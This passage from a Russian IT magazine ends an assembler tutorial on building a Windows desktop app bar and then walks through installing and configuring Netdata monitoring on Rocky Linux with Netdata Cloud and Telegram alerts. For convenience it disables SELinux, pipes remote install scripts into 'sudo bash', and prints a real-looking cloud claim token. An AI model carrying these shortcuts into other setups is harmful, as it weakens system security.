разместить панель. Без лишней скромности отправим заявку через abd.rc
на весь размер экрана, а операционная система приведет значения полей
структуры RECT в соответствие реальной обстановке. Для этого узнаем у сис‐
темы, а потом запишем в abd.rc.right ширину  экрана, уменьшенную
на единицу, а в abd.rc.bottom — уменьшенную на единицу высоту экрана,
после   чего  вызовем   функцию   SHAppBarMessage   с   сообщением
ABM_QUERYPOS.


invoke GetSystemMetrics, SM_CXSCREEN
dec eax
mov [abd.rc.right], eax
invoke GetSystemMetrics, SM_CYSCREEN
dec eax
mov [abd.rc.bottom], eax
invoke SHAppBarMessage, ABM_QUERYPOS, abd

После возврата в структуре abd.rc будут находиться границы допустимой
области. Нам же нужна только полоса шириной APPBAR_THICKNESS у верхнего
края рабочего стола. Поэтому подтянем вверх нижнюю координату и затребу‐
ем у операционной системы получившуюся полосу через вызов функции
SHAppBarMessage с сообщением ABM_SETPOS:


mov eax, [abd.rc.top]
add eax, APPBAR_THICKNESS
dec eax
mov [abd.rc.bottom], eax
invoke SHAppBarMessage, ABM_SETPOS, abd
xor eax,eax
ret
endp

В конце процедуры оставляем обнуление регистра EAX командой xor eax,
eax и возврат этого нулевого значения операционной системе, которое она
воспримет как успешное завершение обработчика WM_CREATE.
   Пока предположим, что мы все сделали правильно. Результатом выпол‐
нения перечисленных действий должно стать отрезание полосы от верхней
границы рабочего стола. Если запустить программу в таком виде, то зарезер‐
вированная область останется «не у дел» даже после ее завершения и при‐
дется перезагружать компьютер. Мы должны явным образом вернуть опе‐
рационной системе полученную во временное пользование полосу, для чего
дополним в оконной процедуре WindowProc блок обработки сообщения
WM_DESTROY следующей строкой (ее надо вставить сразу после метки .
wmdestroy):


invoke SHAppBarMessage, ABM_REMOVE, abd


             INFO

                          Промежуточный  вариант  программы,  который
                           умеет  резервировать  и  освобождать  участок
                          рабочего стола: appbar-ver3.asm.


А вот теперь можно и даже нужно запустить получившуюся программу и пос‐
мотреть, как она работает. Пробуй перемещать окна приложений, разворачи‐
вать их на весь экран и смотри, как они себя при этом ведут. Обрати вни‐
мание, что главное окно получившейся программы существует как будто
отдельно от зарезервированной им на рабочем столе полосы. При завер‐
шении программы ситуация на рабочем столе должна восстанавливаться.
Если остаются какие‑то особенности, то перезагрузи компьютер и вни‐
мательно проверь программу.


НАСТРОЙКА ОКНА ПАНЕЛИ
Осталось только привести главное окно нашего приложения в соответствие
с его задачей. Для  этого,  во‑первых, подправим  стили окна в  строке
с вызовом функции CreateWindowEx следующим образом:


invoke  CreateWindowEx,WS_EX_TOPMOST+WS_EX_TOOLWINDOW,_class,_title,
WS_POPUP,128,128,256,192,NULL,NULL,[wc.hInstance],NULL

А во‑вторых, дополним процедуру wmCreateProc строками, выполняющими
позиционирование окна на зарезервированной полосе рабочего  стола.
Для этого сразу после ее заголовка поместим строку определения локальных
переменных:


local width:DWORD, height:DWORD

После имени переменной через двоеточие указан ее тип (как в паскале). Ана‐
логичным образом можно указывать типы параметров процедур. Мы этого
не делали, потому что нас устраивает 32-битный тип, предполагаемый
по умолчанию. Строки вычисления размеров и перемещения окна надо раз‐
местить в конце процедуры перед формированием возвращаемого значения
в регистре EAX:


mov eax, [abd.rc.right]
sub eax, [abd.rc.left]
inc eax
mov [width], eax
mov eax, [abd.rc.bottom]
sub eax, [abd.rc.top]
inc eax
mov [height], eax
invoke SetWindowPos, [hwnd], HWND_TOP, [abd.rc.left], [abd.rc.top], [
width], [height], SWP_NOACTIVATE+SWP_SHOWWINDOW


             INFO

                          Окончательный вариант программы: appbar.asm.



Запусти  получившееся  приложение.  Место  зарезервированной полосы
рабочего стола должно занять серое окно без рамок и заголовка — наша
заплатка. Не пытайся завершить программу через диспетчер задач, потому
что зарезервированная часть рабочего стола в этом случае не освободится.
Вместо этого щелкни левой кнопкой мыши по этой полосе и нажми ком‐
бинацию клавиш Alt-F4. Программа завершится, а рабочий стол вернется
в исходное состояние.


ЗАКЛЮЧЕНИЕ
Так мне  удалось  устранить  главное  неудобство  от  дефекта  монитора
при использовании развернутых на весь экран приложений. Попутно мы узна‐
ли о том, как создать свою панель инструментов для рабочего стола Windows.
   Разработанное приложение можно взять в качестве заготовки для более
функциональной панели, а не такой, которая, как картина в мультфильме
про дядю Федора, «дырку на обоях загораживает». В качестве панели
использовано главное окно приложения, что позволяет добавить на него эле‐
менты управления, текст, рисунки... Но первым делом я бы добавил защиту
от повторного запуска программы (для этого надо воспользоваться име‐
нованным мьютексом, который создается с помощью функции CreateMutex).
Не помешает добавить и реагирование на уведомления MSG_ABNOTIFY — их
может отправлять нашему окну операционная система (например, при запус‐
ке полноэкранного приложения или активности соседних панелей).
  А вот выбранный инструмент разработки Flat Assembler с ассемблером
в качестве языка программирования оставляет противоречивые  чувства.
К положительным чертам можно отнести:
 • компактный размер и быстрое развертывание на любом Windows-компь‐
   ютере;
 • возможность полноценно использовать методологию структурного прог‐
   раммирования благодаря макроопределениям, что практически снимает
   ограничение на сложность проектов;
 • одинаковая работа приложений на всей линейке Windows от Windows
   2000 до Windows 10 x86-64 благодаря использованию Win32 API;
 • малый размер генерируемых EXE-файлов (разработанное в статье при‐
   ложение занимает 2,5 Кбайт на диске).

Спорные моменты, на мой взгляд, следующие:
 • жесткая привязка к архитектуре процессоров Intel;
 • слабая «защита от дурака»  (практически  отсутствует  контроль типов
   переменных и соответствия фактических аргументов при вызове функций
   объявленным формальным параметрам).

Как бы то ни было, с использованием Flat Assembler вполне можно изучать
основы программирования на ассемблере для архитектуры х86. Этот инстру‐
мент поможет освоить синтаксис и основные конструкции языка всем, кто
еще не сталкивался с ассемблером, но желает использовать его в будущем
для создания собственных приложений.
АДМИН
NETDATA

НАСТРАИВАЕМ ПРОСТУЮ БЕСПЛАТНУЮ
СИСТЕМУ МОНИТОРИНГА





       Ruslan Kh.
       root@xakru.me





Возможно, у тебя есть сервер, роутер или еще какой‑то
девайс, за работой которого нужно следить. Как сделать
систему мониторинга, которая сама по себе не будет тре‐
бовать внимания и ресурсов? Я рекомендую в таких случаях
использовать простой, а главное — бесплатный инструмент
под названием Netdata. О его возможностях я расскажу
в этой статье.


Обычно для сбора статистики приходится разворачивать что‑то большое
и громоздкое, вроде Zabbix, Nagios или Icinga. Для них еще нужны базы дан‐
ных, постоянный публичный доступ с белым IP и вычислительные мощности,
которые можно было бы потратить на что‑нибудь другое. Обслуживание
подобных продуктов тоже порой оказывается весьма затратным.
  Но  что  делать, если нужен  просто  мониторинг без  энтерпрайзных
решений, но с широкими возможностями? При этом хорошо бы не занимать‐
ся поддержкой, миграциями, обновлениями, заменой комплектующих и про‐
чими ресурсозатратными вещами? Специально для решения именно этой
практической задачи  существует агент  Netdata.  Постараюсь  рассказать
о возможностях Netdata и о тех функциях, которые я использую в своих про‐
ектах. В статье мы рассмотрим установку агента Netdata на примере Rocky
Linux.


О NETDATA
Netdata — это агент, который предназначен для развертывания на физичес‐
ких и виртуальных серверах, в контейнерах, на IoT-устройствах. Он работает
в Linux, FreeBSD, macOS, Kubernetes, Docker, LXC, LXD, Xen и прочих.
   Агент Netdata отслеживает большое количество показателей системы.
Функциональность расширяется готовыми  плагинами. Есть хорошо сос‐
тавленное руководство, как писать собственные кастомизированные допол‐
нения. Если раньше при создании плагинов предпочтение отдавалось Python,
то теперь разработчики переходят на язык Go (Golang). Поддержку Python
никто не отменяет, кроме того, агент умеет работать с плагинами на Bash
и Node.js.
   Netdata использует файлы из procfs для базового мониторинга системы.
После запуска агента стартуют плагины, которые подключаются к мониторин‐
гу сервисов. Порты и методы мониторинга предопределены в конфигурации
по  умолчанию.  Если  сервисы  для  запускаемых  плагинов  недоступны
или отсутствуют, их работа прекратится, но это не приведет к остановке
или краху Netdata, как это происходит, например, с telegraf. Потребление
ресурсов крайне невелико, ведь Netdata работает и на роутерах с OpenWRT.
   Netdata «из коробки» поддерживает мониторинг внушительного списка
сервисов. Это PostgreSQL, MySQL, Redis, RabbitMQ, MongoDB, OpenLDAP,
SNMP, Apache, nginx и другие. Реализован сбор и агрегация метрик вплоть
до одной секунды, имеются готовые триггеры событий для оповещений в
/usr/lib/netdata/conf.d/health.d/. Агент собирает статистику потребле‐
ния  ресурсов по  пользователям и  сервисам (CPU,  IO, RAM,  network)
с помощью apps.plugin. По умолчанию список состоит из наиболее рас‐
пространенных сервисов, которые сгруппированы по категориям, и этот спи‐
сок может быть расширен. Имеется поддержка оповещений по триггерам
с использованием следующих инструментов:
 • alerta.io;
 • Amazon Simple Notification Service;
 • Discord;
 • Dynatrace;
 • Email;
 • Flock;
 • Google Hangouts;
 • IRC;
 • Kavenegar;
 • Matrix;
 • MessageBird;
 • Microsoft Teams;
 • Opsgenie;
 • PagerDuty;
 • Prowl;
 • PushBullet;
 • PushOver;
 • Rocket.Chat;
 • Slack;
 • SMS Server Tools 3;
 • StackPulse;
 • Syslog;
 • Telegram;
 • Twilio;
 • Dashboard  (HTML-уведомления при  открытой  вкладке  Netdata-агента
   в браузере).

Кроме того, существует возможность сбора и агрегации данных в Netdata
Cloud,  для   доступа   к   данным   статистики   имеется   специальный
веб‑интерфейс. Также в Netdata Cloud отсутствуют следующие ограничения:
 • на Retention Policy (период хранения данных);
 • на количество пользователей в организации;
 • на количество нод, контейнеров, хостов;
 • на количество администраторов;
 • на уведомления (email, webhooks).

Конечно же, при предоставлении сервиса по бесплатной модели гарантий
обеспечения доступности нет никаких, но сами разработчики утверждают:
«Netdata Cloud  возлагает на себя обязательства перед пользователями
по обеспечению бесплатного и неограниченного мониторинга навсегда».


ПОДГОТОВКА К УСТАНОВКЕ NETDATA
В статье будет использована виртуальная машина с адресом 172.16.210.134.
Чтобы у тебя, дорогой читатель, не возникло сложностей в процессе зна‐
комства с Netdata при включенном SELinux в режиме enforcing, предлагаю его
выключить. Начнем с обновления системы:


$ sudo yum update -y

Проверим текущий статус SELinux:



  [xakep@netdata ~]$ sestatus
    SELinux status:                 enabled
    SELinuxfs mount:                /sys/fs/selinux
    SELinux root directory:         /etc/selinux
    Loaded policy name:             targeted
    Current mode:                   enforcing
    Mode from config file:          enforcing
    Policy MLS status:              enabled
    Policy deny_unknown status:     allowed
    Memory protection checking:     actual (secure)
    Max kernel policy version:      33


Теперь отключим SELinux и перезагрузим систему:



  [xakep@netdata ~]$ sudo setenforce 0


  [xakep@netdata ~]$ sestatus
    SELinux status:                 enabled
    SELinuxfs mount:                /sys/fs/selinux
    SELinux root directory:         /etc/selinux
    Loaded policy name:             targeted
    Current mode:                   permissive
    Mode from config file:          enforcing
    Policy MLS status:              enabled
    Policy deny_unknown status:     allowed
    Memory protection checking:     actual (secure)
    Max kernel policy version:      33


  [xakep@netdata ~]$ sudo sed -i 's/^SELINUX=enforcing/SELINUX=disabled/'
  /etc/selinux/config
  [xakep@netdata ~]$ sudo reboot


Наконец, проверим статус SELinux после перезагрузки:



  [xakep@netdata ~]$ getenforce
    Disabled
  [xakep@netdata ~]$ sestatus
    SELinux status: disabled



УСТАНОВКА NETDATA
Разработчики Netdata предоставляют несколько способов установки агента:
 • скрипт kickstart.sh;
 • скрипт packagecloud.io для подключения к репозиторию Netdata.

Мы будем использовать второй способ — скрипт для подключения репози‐
тория. По опыту администрирования бинарных дистрибутивов рекомендую
придерживаться установки пакетов из репозиториев, так как подчищать сис‐
тему за самописными скриптами — то еще удовольствие. Скрипт подключит
наш Rocky Linux к нужному .rpm-репозиторию, останется только вручную уста‐
новить пакет Netdata.


             INFO

                        Netdata  по  умолчанию  собирает  анонимную
                      информацию об использовании и отправляет ста‐
                            тистику на серверы Netdata в PostHog. PostHog —
                        это платформа для анализа продуктов с открытым
                     исходным кодом. Анонимная статистика собира‐
                        ется из двух источников в Netdata:
                  •с дашбордов (web GUI);
                  •с backend-агента.

                          Собираются следующие данные:
                  •версия Netdata;
                  •операционная система (ОС), версия ОС;
                  •ядро ОС, версия ядра, архитектура ядра;
                  •технология виртуализации;
                  •технология контейнеризации.

                           Также в статистику входят отчеты о сбоях и ошиб‐
                           ках.


Разработчики Netdata  утверждают, что  статистика использования  агента
для них жизненно важна, поскольку эти данные необходимы для обнаружения
ошибок и планирования новых функций, то есть для улучшения продукта.
Отключать или нет эту функциональность — решать тебе, какой‑либо деструк‐
тивной функции он в себе не несет. Отключить сбор и передачу статистики
можно любым из трех способов:
 • создать  файл  .opt-out-from-anonymous-statistics  в  /etc/
  netdata/ перед запуском;
 • при установке Netdata указать в скрипте опцию --disable-telemetry
   (не для нашего случая);
 • передать переменную окружения DO_NOT_TRACK=1 (например, при деп‐
   лое Docker-контейнера).

Приступаем к установке Netdata:


# Подключение репозитория epel
$ sudo yum install epel-release -y


# Скачивание скрипта для подключения репозитория Netdata
$ curl -s https://packagecloud.io/install/repositories/netdata/
netdata/script.rpm.sh | sudo bash


# Установка Netdata
$ sudo yum install netdata -y

Чтобы получить текущий файл конфигурации Netdata, нужно запустить агент
и выполнить следующую команду (осторожно, конфиг очень длинный и необ‐
ходим лишь для ознакомления с основными опциями):


$ curl -o ~/netdata.conf http://localhost:19999/netdata.conf

При  правке  конфигурации  Netdata  вручную  разработчики  рекомендуют
использовать скрипт‑обертку edit-config:


# Переход в директорию c конфигурацией Netdata
$ cd /etc/netdata/


# Подсказка: вместо sample.conf нужно указать необходимый файл из /
usr/lib/netdata/conf.d/
$ sudo ./edit-config <sample.conf>


НАСТРОЙКА NETDATA
Основной файл конфигурации называется /etc/netdata/netdata.conf, и с
минимально необходимыми параметрами он выглядит следующим образом:


[global]
  run as user = netdata


  # The default database size — 1 hour
  history = 3600


  # Some defaults to run Netdata with least priority
  process scheduling policy = idle
  OOM score = 1000


[web]
  web files owner = root
  web files group = netdata


  # By default do not expose the Netdata port
  bind to = localhost

Внесем несколько изменений:


[global]
  OOM score = -900
  run as user = netdata
  enable zero metrics = yes
  # Some defaults to run Netdata with least priority
  process scheduling policy = idle
  # Database size — 20 min
  history = 1200


[web]
  # By default do not expose the Netdata port
  bind to = localhost
  web files owner = root
  web files group = netdata


[health]
  enabled = yes


[host labels]
  type = virt
  location = xakep
  instance = netdata

Параметр OOM score указывает значение для /proc/[pid]/oom_score_adj,
которое по совокупности факторов позволяет задать приоритет процесса
для его «убийства» при вызове oom_killer. По умолчанию Netdata имеет зна‐
чение OOM score равным 1000, что ставит ее одним из первых кандидатов
на «убийство». Но поскольку нам необходима статистика по ресурсам сер‐
вера, если этих самых ресурсов не хватает, чтобы выявить виновника, агент
Netdata нужно прибивать в самую последнюю очередь.
  Для проверки oom-score можно было бы воспользоваться утилитой choom,
но в Rocky Linux, как и в CentOS, и в Red Hat, util-linux поставляется вер‐
сии 2.32, а choom доступен с версии util-linux 2.33 (Util-linux 2.33 Release
Notes от 1 ноября 2018 года). Несмотря на то что автор choom — один из сот‐
рудников Red Hat, в самой ОС и ее производных дистрибутивах (кроме
Fedora) все еще используется util-linux-2.32.
  Но не будем о грустном, а продемонстрируем работу choom и действие
параметра OOM score c util-linux-2.37.2-r1 на примере Fedora. При OOM
score = 1000:



  [xakep@netdata ~]$ choom -p $(cat /var/run/netdata/netdata.pid)
  pid 15731's current OOM score: 1334
  pid 15731's current OOM score adjust value: 1000


При OOM score = -900:



  [xakep@netdata ~]$ choom -p $(cat /var/run/netdata/netdata.pid)
  pid 17958's current OOM score: 667
  pid 17958's current OOM score adjust value: 0


Теперь кратко пробежимся по параметрам:
 • bind to я оставляю, так как не планирую обращаться к дашборду нап‐
  рямую или по сети, выставлять за nginx и прочее. Пока нам необходима
   просто статистика по показателям и метрикам с длительностью в месяцы
   и годы;
 • enable  zero  metrics полезно включить, это позволит наблюдать
   за наличием метрик даже с нулевыми значениями;
 • history — я сокращаю локальную БД Netdata до приемлемых минималь‐
   ных значений для меньшего потребления ресурсов. Для БД используется
   как диск, так и оперативная память. В нашем случае статистика по мет‐
   рикам будет сокращена до 20 минут. На этом сайте можно воспользовать‐
   ся калькулятором расчета необходимых ресурсов при различных значени‐
   ях для БД;
 • host labels — этот параметр служит для указания кастомизированных
   глобальных тегов. Удобен для группирования хостов, систем по катего‐
   риям. Рекомендую прочитать рекомендации и ограничения при указании
  host labels. Указанные теги (type, location, instance) и их зна‐
   чения — кастомные, нет необходимости  привязываться  к  указанным
   здесь, ты можешь объявить свои собственные теги;
 • memory deduplication (ksm) (Kernel SamePage Merging). Я не вклю‐
  чаю KSM, так как в рассматриваемом нами примере в этом нет необ‐
   ходимости. Для включения KSM в Netdata необходимо предварительно
   включить KSM в самом Linux. По умолчанию KSM не используется в Red
   Hat, Rocky, CentOS, но, если он нужен, следует предварительно снять ста‐
   тистику использования ресурсов до включения KSM в течение длительного
   времени, а затем включить и понаблюдать за использованием ресурсов
   с включенным KSM. В системах с несколькими CPU экономия оперативной
   памяти, возможно, будет незначительной, а нагрузка на процессоры
   заметно  увеличится.  Производительность KSM,  конечно  же, зависит
   от задач, с которыми работает система, потому что при включении KSM
   выделение новых страниц памяти потребует дополнительных операций,
   ведь для этого будет задействован механизм copy-on-write.

Приводить рекомендации по настройке iptables и nginx для организации
доступа я не буду, поскольку наш хост будет подключаться к Netdata Cloud.
Для доступа к дашборду Netdata на реальном или виртуальном хосте можно
пробросить SSH-туннель. В примере ниже использован адрес виртуального
хоста (172.16.210.134) с запущенным Netdata-агентом. Для создания туннеля
выполни следующую команду:


$ ssh -NL 19999:127.0.0.1:19999 xakep@172.16.210.134

Чтобы получить доступ к дашборду Netdata виртуального хоста, после уста‐
новки туннеля перейди в браузере по адресу http://127.0.0.1:19999.





                   Веб‑интерфейс агента Netdata

Для организации централизованного доступа к статистике с одним даш‐
бордом для всех хостов есть несколько способов:
 • поднять одну из поддерживаемых TSDB (TimeSeries Database) в качестве
   backend для Netdata;
 • настроить агенты Netdata на стриминг, где будет настроен родительский
   инстанс Netdata (parent) и дочерние (child);
 • подключить агент к Netdata Cloud.



                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИАДМИН
            NETDATA

              НАСТРАИВАЕМ ПРОСТУЮ БЕСПЛАТНУЮ
                       СИСТЕМУ МОНИТОРИНГА





ПОДКЛЮЧЕНИЕ К NETDATA CLOUD
В арсенале Netdata Cloud имеются неограниченные ресурсы (процессор,
память, диск, сеть), а от нас потребуется развернутая виртуальная машина
с агентом Netdata. Цель — организовать получение уведомлений о сбоях
и возникающих на хостах проблемах с минимальными временными и финан‐
совыми затратами, ну и с минимальными издержками на поддержание сис‐
темы мониторинга. Так как при проблемах в сети провайдера и в случае
недоступности агента Netdata уведомления нам поступать не смогут, для это‐
го и нужен внешний дашборд с постоянным доступом к нему по сети.
   Агент Netdata подключается к Netdata Cloud при помощи небольшого
скрипта, после выполнения которого в /var/lib/netdata/cloud.d/ будут
сгенерированы приватный и публичный ключи, размещен конфигурационный
файл и файл с токеном для подключения. Скрипт с нужными токенами ты
можешь получить после регистрации (в админке Netdata Cloud), для этого
нужен только адрес email.





                  Страница регистрации в Netdata Cloud

Указывай свой email и получай на почту ссылку для входа с правами админис‐
тратора в только что созданную для тебя организацию. В ней можно добав‐
лять пользователей, пространства, распределять доступы по группам, стро‐
ить дашборды и прочее.





                  Страница регистрации в Netdata Cloud

Скрипт для подключения виртуального хоста к Netdata Cloud ты получишь
при переходе в раздел WarRooms → General или любую комнату. Я создал
комнату xakep.ru, в которую буду подключать виртуальный хост.





               Скрипт регистрации хоста в Netdata Cloud

Выделенная секция под номером 3 на скриншоте выше и есть тот самый
скрипт для подключения хоста, который нужно выполнить на хосте, где ты
установил агент Netdata. В моем случае это виртуальная машина по адресу
172.16.210.134:



  [xakep@netdata ~]$ sudo bash curl -Ss https://my-netdata.io/kickstart.
  sh) --claim-token jv_384duX8LipGm5jBqb6oupVh7W5Vcvst_niARBxhRpsW-
  71uCSSX2xfD0_2D4y_ndxVWUf-
  MWa42WfMz4kbm7KUhkmvf75bgmpV4rKeNDMDLWVHa3goE4SXW9bfiapOOQpdmM --claim-
  rooms 341e4fe1-14fb-4181-ad5a-445b157e80fe --claim-url https://app.
  netdata.cloud
   --- Found existing install of Netdata under: / ---
   --- Existing install appears to be handled manually or through
  the system package manager. ---
   --- Attempting to claim agent to https://app.netdata.cloud ---
  Token: ****************
  Base URL: https://app.netdata.cloud
  Id: 7e48a49e-7218-11ec-b69f-000c294a3927
  Rooms: 341e4fe1-14fb-4181-ad5a-445b157e80fe
  Hostname: netdata.xakep.local
  Proxy:
  Netdata user: netdata
  Generating private/public key for the first time.
  Generating RSA private key, 2048 bit long modulus (2 primes)
  .....................+++++
  ........................................................................
  ..................+++++
  e is 65537 (0x010001)
  Extracting public key from private key.
  writing RSA key
  Connection attempt 1 successful
  Node was successfully claimed.
   --- Successfully claimed node ---


Вот оно — успешное подключение виртуальной машины к Netdata Cloud
с демонстрацией ее показателей.





                     Подключенный к Netdata Cloud хост


ПЛАГИНЫ
Netdata переводит плагины c Python на Golang, выделив их в отдельный ре‐
позиторий. Включение Golang-плагинов в Netdata (актуальный список и кон‐
фиги Golang-плагинов) выглядит следующим образом:


# Переходи в директорию c конфигами Netdata
$ cd /etc/netdata/


# Включай необходимые плагины, используя скрипт-обертку
$ sudo ./edit-config go.d.conf

Даже если файла go.d.conf нет в директории /etc/netdata, используем
скрипт edit-config для редактирования конфигов. Скрипт создаст этот
файл, скопировав его из /usr/lib/netdata/conf.d/, и откроет для редак‐
тирования. Указанной команды достаточно для примитивного включения пла‐
гина, в некоторых случаях необходима настройка плагина в файле /etc/
netdata/go.d/<plugin_name>.conf. Подобный метод включения актуален
также для плагинов, написанных на Python, с поправкой на указание файла —
go.d.conf нужно изменить на python.d.conf.
  Для примера давай установим pdns-recursor и включим его статистику.
Рdns-recursor — это рекурсивный DNS-сервер, ранее выделенный в отдель‐
ный проект из единого решения powerdns.  Установка выполняется сле‐
дующей командой:


$ sudo yum install pdns-recursor -y

Теперь настроим powerdns-recursor для отдачи статистики. В документации
к плагину и в документации самого powerdns указаны необходимые действия:
 • включение параметра webserver в powerdns-recursor для демонстра‐
   ции статистики;
 • включение HTTP API указанием значения параметра api-key для предос‐
   тавления доступа к статистике.


             INFO

                           Команды из этой демонстрации и следующих
                         подобных можешь  копировать и  использовать
                          прямо из плеера — это текст. Но будь осторожен:
                        в буфер могут попасть лишние символы.


Настройка powerdns-recursor показана на следующем видео:

        [xakep@netdata ~]$ vi /etc/pdns-recursor/recursor.conf
        [xakep@netdata ~]$ yum install pwgen -y





  А вот процедура создания и правки конфига go.d.conf и включения пла‐
гина на Go powerdns_recursor:

        [xakep@netdata ~]$ cd /etc/netdata/
        [xakep@netdata netdata]$ ls go.d.conf
        ls: cannot access 'go.d.conf': No such file or directory
        [xakep@netdata netdata]$ sudo .





  Для применения изменений необходимо перезапустить Netdata:


$ sudo systemctl restart netdata.service





                Данные powerdns_recursor в агенте Netdata

Внимательный читатель на скриншоте выше мог заметить,  что  секция
powerdns recursor в колонке справа задвоилась. Одна, с названием job-a,
относится к powerdns, а другая — к local. Мы же настраивали local. Нужно
проверить логи Netdata (/var/log/netdata/error.log):



  [xakep@netdata ~]$ grep powerdns /var/log/netdata/error.log
    2022-01-12 19:36:36: go.d INFO: main[main] looking for 'powerdns.conf'
  in [/etc/netdata/go.d /usr/lib/netdata/conf.d/go.d]
    2022-01-12 19:36:36: go.d INFO: main[main] found
  '/usr/lib/netdata/conf.d/go.d/powerdns.conf
    2022-01-12 19:36:36: go.d INFO: main[main] looking for
  'powerdns_recursor.conf' in [/etc/netdata/go.d
  /usr/lib/netdata/conf.d/go.d]
    2022-01-12 19:36:36: go.d INFO: main[main] found
  '/etc/netdata/go.d/powerdns_recursor.conf
    2022-01-12 19:36:36: go.d ERROR: prometheus[powerdns_exporter_local]
  Get "http://127.0.0.1:9120/metrics": dial tcp 127.0.0.1:9120: connect:
  connection refused
    2022-01-12 19:36:36: go.d ERROR: prometheus[powerdns_exporter_local]
  check failed
    2022-01-12 19:36:36: go.d ERROR: powerdns[local]
  'http://127.0.0.1:8081/api/v1/servers/localhost/statistics' returned
  HTTP status code: 401
    2022-01-12 19:36:36: go.d ERROR: powerdns[local] check failed
    2022-01-12 19:36:36: python.d INFO: plugin[main] : [powerdns] built 1
  job(s) configs
    2022-01-12 19:36:36: python.d INFO: plugin[main] : powerdns[powerdns]
  : check failed
    2022-01-12 19:36:59: go.d ERROR: powerdns_recursor[local]
  'http://127.0.0.1:8081/api/v1/servers/localhost/statistics' returned
  HTTP status code: 401
    2022-01-12 19:36:59: go.d ERROR: powerdns_recursor[local] check failed
    2022-01-12 19:52:26: go.d INFO: main[main] looking for
  'powerdns_recursor.conf' in [/etc/netdata/go.d
  /usr/lib/netdata/conf.d/go.d]
    2022-01-12 19:52:26: go.d INFO: main[main] found
  '/etc/netdata/go.d/powerdns_recursor.conf
    2022-01-12 19:52:26: go.d INFO: main[main] looking for 'powerdns.conf'
  in [/etc/netdata/go.d /usr/lib/netdata/conf.d/go.d]
    2022-01-12 19:52:26: go.d INFO: main[main] found
  '/usr/lib/netdata/conf.d/go.d/powerdns.conf
    2022-01-12 19:52:26: python.d INFO: plugin[main] : [powerdns] built 1
  job(s) configs
    2022-01-12 19:52:26: python.d INFO: plugin[main] : powerdns[powerdns]
  : check success
    2022-01-12 19:52:27: go.d ERROR: powerdns[local] returned metrics
  aren't PowerDNS Authoritative Server metrics
    2022-01-12 19:52:27: go.d ERROR: powerdns[local] check failed
    2022-01-12 19:52:47: go.d ERROR: prometheus[powerdns_exporter_local]
  Get "http://127.0.0.1:9120/metrics": dial tcp 127.0.0.1:9120: connect:
  connection refused
    2022-01-12 19:52:47: go.d ERROR: prometheus[powerdns_exporter_local]
  check failed
    2022-01-12 19:52:47: go.d INFO: powerdns_recursor[local] check success
    2022-01-12 19:52:47: go.d INFO: powerdns_recursor[local] started, data
  collection interval 1s


Из лога нам нужны эти две строки:


2022-01-12 19:52:26: python.d INFO: plugin[main] : powerdns[
powerdns] : check success
2022-01-12 19:52:47: go.d INFO: powerdns_recursor[local] check
success

Теперь понятно, что задействованы два плагина — первый на Python, второй
на Go. Отключим Python-версию плагина, оставив версию на Go, а потом
перезапустим агент.

        [xakep@netdata netdata]$ cd /etc/netdata/
        [xakep@netdata netdata]$ sudo ./edit-config python.d.conf
        Copying '/usr/lib/netdata/conf.d/python.d.conf' to '/etc/netdata/python.d.conf' ...
        Editing '/etc/netdata/python.d.conf' ...
        [xakep@netdata netdata]$ /





  В выводе лога Netdata сообщает нам об успешном включении плагина
powerdns_recursor на Go, при этом мы не наблюдаем плагина на Python:


2022-01-13 17:40:21: go.d INFO: powerdns_recursor[local] check
success
2022-01-13 17:40:21: go.d INFO: powerdns_recursor[local] started,
data collection interval 1s




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИАДМИН
            NETDATA

              НАСТРАИВАЕМ ПРОСТУЮ БЕСПЛАТНУЮ
                       СИСТЕМУ МОНИТОРИНГА





ОПОВЕЩЕНИЯ (ALERTS)
При подключении к Netdata Cloud уведомления пока отправляются только
на email. В будущем ожидаются оповещения через webhooks, но сроки внед‐
рения этой фичи неизвестны. Если тебе нужны другие методы оповещения,
настройка производится на хосте с агентом Netdata (в нашем случае —
на виртуальном хосте).


Создание бота и канала в Telegram
Для получения оповещений в Telegram можно использовать бота, при этом
у тебя должен быть действующий аккаунт в этом мессенджере. Для начала
прочитай руководство по созданию бота.





                        Создание бота в Telegram

Создай канал, в который бот будет отправлять оповещения Netdata.





                Создание Telegram-канала для оповещений





            Указание названия Telegram-канала для оповещений





             Настройки Telegram-канала для оповещений Netdata

Теперь добавь бота в созданный канал к администраторам, желательно огра‐
ничить бота правами только на публикацию сообщений.





                 Добавление бота в администраторы канала





                 Добавление бота в администраторы канала





                   Права бота как администратора канала

Отправь сообщения с твоей учетной записи Telegram в только что созданный
канал для его активации. Это поможет узнать ID канала в свойствах твоего
бота.      Затем      получи       ID      канала      по       ссылке
https://api.telegram.org/botXXX:YYYY/getUpdates. Замени XXX:YYYY токеном
твоего бота. Токен можно узнать у @BotFather c помощью его команд,
в ответе будет что‑то подобное:


{
  "ok":true,
  "result":[{
    "update_id":976400277,
    "channel_post":{
      "message_id":3,
      "sender_chat":{
        "id":-1001513455910,
        "title":"netdata alerts - xakep.ru",
        "type":"channel"
      },
      "chat":{
        "id":-1001513455910,
        "title":"netdata alerts - xakep.ru",
        "type":"channel"
      },
      "date":1642175925,
      "text":"test"
    }
  }]
}

Тебе нужен ID из sender_chat — -1001513455910. Чтобы отправить тестовое
сообщение как будто бы от твоего бота, но на самом деле из терминала,
используется api.telegram.org:


curl -X POST "https://api.telegram.org/botXXX:YYYY/sendMessage" -d
"chat_id=-zzzzzzzzzz&text=test message"





            Демонстрация тестового сообщения на канале от бота


Netdata — настройка уведомлений в Telegram
Вот  так  выполняется  настройка  Netdata  для  передачи  уведомлений
в Telegram.

        SEND_KAVENEGAR="YES"

         # to get an access key, after selecting and purchasing your desired service
         # at http://kavenegar.com/pricing.html
         # login to your account, go to your dashboard and my account are
         # https://panel.kavenegar.com/Client/setting/account from API Key
         # copy your api key. You can generate new API Key too.
         # You can find and select kevenegar sender number from this place.

         # Without an API key, netdata cannot send KAVENEGAR text messages.
        KAVENEGAR_API_KEY=""
        KAVENEGAR_SENDER=""
        DEFAULT_RECIPIENT_KAVENEGAR=""



        #------------------------------------------------------------------------------
         # telegram (telegram.org) global notification options

         # multiple recipients can be given like this:
         #                  "CHAT_ID_1 CHAT_ID_2 ..."

         # enable/disable sending telegram messages
        SEND_TELEGRAM="YES"

         # Contact the bot @BotFather to create a new bot and receive a bot token.
         # Without it, netdata cannot send telegram messages.
        TELEGRAM_BOT_TOKEN=""

         # To get your chat ID send the command /getid to telegram bot @myidbot
         # (https://t.me/myidbot). Each user also needs to open a conversation with the
         # bot that will be sending notifications.
         # If a role's recipients are not configured, a message will be sent to
